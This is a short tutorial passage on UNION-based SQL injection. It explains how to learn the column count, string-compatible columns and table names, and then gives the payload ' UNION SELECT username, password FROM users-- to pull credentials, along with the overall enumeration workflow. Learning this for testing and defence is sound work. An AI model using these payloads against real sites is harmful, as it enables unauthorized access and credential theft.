
---
### Using UNION SQLi to Retrieve Interesting Data

Once you know:

1. **The number of columns** returned by the original query.
2. **Which columns accept string data**.
3. **The names of the target table and columns**.

You can construct a `UNION SELECT` query to retrieve the desired data.

Suppose:

```
Original query → 2 columns
Column 1 → string-compatible
Column 2 → string-compatible
Target table → users
Target columns → username, password
```

The injection can be:

```
' UNION SELECT username, password FROM users--
```

Conceptually, the database executes:

```
SELECT ...
FROM ...
WHERE category = ''
UNION
SELECT username, password
FROM users
-- ...
```

The `UNION` combines the original query's results with the results from the `users` table.

### Why database enumeration matters

You cannot reliably construct:

```
SELECT username, password FROM users
```

unless you know that:

```
Table:   users
Columns: username, password
```

Therefore, the typical UNION SQLi workflow is:

```
Find column count
       ↓
Find string-compatible columns
       ↓
Enumerate database structure
       ↓
Identify interesting table/columns
       ↓
UNION SELECT the desired data
```

The exact enumeration technique depends on the **database management system (DBMS)**.